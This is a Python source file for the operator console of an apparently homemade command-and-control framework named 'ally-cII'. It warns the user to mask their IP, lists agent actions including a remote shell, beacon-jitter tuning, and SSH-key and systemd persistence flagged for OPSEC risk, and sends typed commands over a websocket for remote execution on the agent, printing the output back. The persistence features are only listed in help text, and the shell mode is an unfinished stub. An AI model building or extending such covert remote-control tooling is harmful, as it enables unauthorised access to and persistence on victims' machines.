import readline #for semi shell interaction in input()
import asyncio
import json
import websockets


#-----
#### colors for printing #####
RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BOLD = "\033[1m"
PURPLE = "\033[38;2;128;0;255m"
BLUE = "\033[34m"

def banner():
    print(f"""{PURPLE}

                                                                                                      
         .8.          8 8888         8 8888  `8.`8888.      ,8'              ,o888888o.     88 88
        .888.         8 8888         8 8888   `8.`8888.    ,8'              8888     `88.   88 88 
       :88888.        8 8888         8 8888    `8.`8888.  ,8'            ,8 8888       `8.  88 88
      . `88888.       8 8888         8 8888     `8.`8888.,8'             88 8888            88 88
     .8. `88888.      8 8888         8 8888      `8.`88888'              88 8888            88 88
    .8`8. `88888.     8 8888         8 8888       `8. 8888               88 8888            88 88
   .8' `8. `88888.    8 8888         8 8888        `8 8888               88 8888            88 88
  .8'   `8. `88888.   8 8888         8 8888         8 8888               `8 8888       .8'  88 88
 .888888888. `88888.  8 8888         8 8888         8 8888                  8888     ,88'   88 88
.8'       `8. `88888. 8 888888888888 8 888888888888 8 8888                   `8888888P'     88 88


    {RESET}""")

def warning():
    banner()
    print(f"{BOLD}{RED}[!] warning [!]{RESET}\n")
    print("REMEMBER to take precaution and mask your ip\n")

    while True:
        con = input("do you want to continue[y/n] ").lower()
        if con == "y" or con == "n":
            break

    if con == "y":
        return True

    return False


    

def all_actions(actions):
    if actions == "main":
        print(f"""
        │
        ├─ help 
        │       get this 
        │
        ├─ clear
        │
        └─ exit
                exit from the program
        
        ├─ shell 
        │       get's you in a semi shell with the agent
        │
        ├─ ch-becon
        │       change agent beaco time to have higher or lower jitter
        │
        ├─ ssh-P
        │       ssh persistence with your personal key provided in /ssh-p.txt
        │       [{RED}can lower your OPSEC{RESET}]
        │
        └─ sysd-P
                systemd persistence 
                [{RED}can lower your OPSEC{RESET}]
        
        
              """)

    if actions == "shell":
        print(f"""
        │
        ├─ help 
        │       get this 
        │
        ├─ clear
        │
        └─ exit
                exit from the program
        
        the this shell does http request to the
        room url so you can chat with the agent
        and get the output back
        
              """)
    

def clear():
    print("\033[2J\033[H", end="")
#-----



def semi_shell():
    while True:
        try:
            shell_cmd = input(f"{BLUE}SHELL@ctrl{RESET}> ")
            
            if shell_cmd == "/exit":
                print(f"\n{BLUE}[*]{RESET} exit shell mode\n")
                return
            elif shell_cmd == "/help":
                all_actions("shell")
            elif shell_cmd == "/clear":
                clear()

            #send command 





        except KeyboardInterrupt:
            # ctrl + c
            print(f"\n\n[{RED}!{RESET}] you pressed Ctrl+C.")
            conferma = input(f"do you really want to exit {BOLD}shell{RESET}? (y/n): ").strip().lower()
            if conferma == 'y':
                print(f"\n{BLUE}[*]{RESET} exit shell mode\n")
                break
            else:
                print("Operation canceled.\n")



async def main(server_url):


    if not warning():
        return
#     print(f"""\n
# {BOLD}welcome{RESET} to the ally-cII pannel use {BOLD}/help{RESET} to view
# all the possible actions
#           """)
    print(f"\n\n{BOLD}welcome{RESET} to the ally-cII pannel use {BOLD}/help{RESET} to view")
    print(f"all the possible actions\n")
   

    try: 
        async with websockets.connect(server_url) as websocket:
            while True:
                try: 
                    cmd = await asyncio.to_thread(input, f"{YELLOW}COMM@ctrl{RESET}> ")

                    cmd = cmd.strip().lower()

                    if cmd == "exit":
                        return
                    elif cmd == "help":
                        all_actions("main")
                        continue
                    elif cmd == "clear":
                        clear()
                        continue
                    elif cmd == "shell":
                        print(f"\n{BLUE}[*]{RESET} passing to shell mode\n")
                        semi_shell()
                        continue


                    payload = {
                            "action": "run_command",
                            "data": cmd
                            }

                    # Invia il messaggio come JSON
                    await websocket.send(json.dumps(payload))

                    # Attende e riceve la risposta dal server
                    response_raw = await websocket.recv()
                    response = json.loads(response_raw)

                    print(f"[Risposta] Status: {response.get('status')} | Output:\n{response.get('output')}\n")






                except KeyboardInterrupt:
                    # ctrl + c
                    print(f"\n\n[{RED}!{RESET}] you pressed Ctrl+C.")
                    conferma = input(f"do you really want to {BOLD}exit{RESET}? (y/n): ").strip().lower()
                    if conferma == 'y':
                        print(f"\n{BLUE}[*]{RESET} closing ally-cII pannel \n")
                        break
                    else:
                        print("Operation canceled.\n")

                except EOFError:
                    # ctrl + d
                    print(f"\n\n[{RED}!{RESET}] you pressed Ctrl+D.")
                    print(f"{BLUE}[*]{RESET} closing ally-cII pannel \n")
                    break

    except websockets.exceptions.ConnectionClosed:
        print("[-] Connessione chiusa dal server.")
    except Exception as e:
        print(f"[-] Errore di connessione: {e}")


if __name__ == "__main__":

    server_url = "ws://127.0.0.1:8080/ws/operator"

    try:
        asyncio.run(main(server_url))
    except KeyboardInterrupt:
        print("\n[*] Uscita forzata dalla CLI.")


